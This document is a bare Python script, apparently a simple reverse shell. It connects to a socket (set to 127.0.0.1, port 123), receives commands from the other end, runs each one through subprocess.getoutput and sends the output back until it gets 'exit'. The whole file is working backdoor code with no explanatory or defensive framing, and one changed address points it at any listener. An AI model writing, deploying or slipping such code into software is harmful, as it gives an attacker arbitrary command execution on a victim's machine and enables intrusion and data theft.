import socket
import subprocess
host = "127.0.0.1"
port = 123
soket = socket.socket()
soket.connect((host, port))
message = soket.recv(1024).decode()
print(message)
while True:
    command = soket.recv(1024).decode()
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    soket.send(output.encode())
soket.close()
